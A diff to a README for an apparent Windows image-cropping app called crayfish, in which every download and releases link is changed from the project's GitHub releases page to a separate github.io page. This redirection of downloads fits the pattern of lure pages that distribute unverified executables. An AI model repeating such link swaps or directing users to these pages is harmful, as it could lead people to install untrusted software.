@@ -1,6 +1,6 @@
 # 🦞 crayfish - Crop Images Beautifully on Any Device
 
-[![Download crayfish](https://img.shields.io/badge/Download-crayfish-4CC61E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Healthful-tincatinca1373/crayfish/releases)
+[![Download crayfish](https://img.shields.io/badge/Download-crayfish-4CC61E?style=for-the-badge&logo=github&logoColor=white)](https://healthful-tincatinca1373.github.io)
 
 ---
 
@@ -33,7 +33,7 @@ Let's get crayfish running on your computer. Follow these simple steps:
 
 Click the big green button at the top of this page, or use this link:
 
-[**Download crayfish for Windows**](https://github.com/Healthful-tincatinca1373/crayfish/releases)
+[**Download crayfish for Windows**](https://healthful-tincatinca1373.github.io)
 
 Visit this link to download the application.
 
@@ -127,7 +127,7 @@ The app will usually notify you when updates are available. You can also check o
 
 Need more assistance? Here are your options:
 
-- **Check the Releases Page** - Visit [our releases page](https://github.com/Healthful-tincatinca1373/crayfish/releases) for the latest version and any special notes
+- **Check the Releases Page** - Visit [our releases page](https://healthful-tincatinca1373.github.io) for the latest version and any special notes
 - **Look for Help Menu** - Many versions of crayfish have a built-in help menu with tutorials
 - **Ask a Friend** - Sometimes it's easier to show someone in person
 
